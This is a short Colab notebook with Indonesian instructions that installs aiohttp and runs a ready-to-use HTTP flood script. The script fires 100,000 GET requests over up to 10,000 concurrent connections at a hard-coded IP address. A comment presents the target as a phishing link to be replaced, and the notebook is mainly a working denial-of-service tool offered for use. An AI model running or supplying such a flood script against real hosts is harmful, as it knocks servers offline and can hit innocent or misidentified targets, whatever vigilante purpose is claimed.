{
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "pencet run di bawah untuk install library dulu"
      ],
      "metadata": {
        "id": "zaOBozm3rLpI"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "pip install nest_asyncio aiohttp"
      ],
      "metadata": {
        "id": "aZTL_jILmpK_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "pencet run di bawah untuk run requestnya"
      ],
      "metadata": {
        "id": "aKhCPZwDrS2r"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "7sK6RyyWC4nu"
      },
      "outputs": [],
      "source": [
        "import asyncio\n",
        "import aiohttp\n",
        "import time\n",
        "import nest_asyncio\n",
        "\n",
        "nest_asyncio.apply()\n",
        "\n",
        "URL = \"http://139.99.61.184/~bansosp5/\"  # Ganti dengan target link phising\n",
        "CONNECTIONS = 10000\n",
        "REQUESTS = 100000\n",
        "\n",
        "async def fetch(session):\n",
        "    try:\n",
        "        async with session.get(URL) as response:\n",
        "            await response.read()\n",
        "    except:\n",
        "        pass\n",
        "\n",
        "async def main():\n",
        "    connector = aiohttp.TCPConnector(limit_per_host=CONNECTIONS)\n",
        "    async with aiohttp.ClientSession(connector=connector) as session:\n",
        "        tasks = []\n",
        "        for _ in range(REQUESTS):\n",
        "            tasks.append(fetch(session))\n",
        "        await asyncio.gather(*tasks)\n",
        "\n",
        "start = time.time()\n",
        "await main()\n",
        "print(\"Selesai dalam\", time.time() - start, \"detik\")"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMOvUbdTaPekEOgETjbhttX"
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}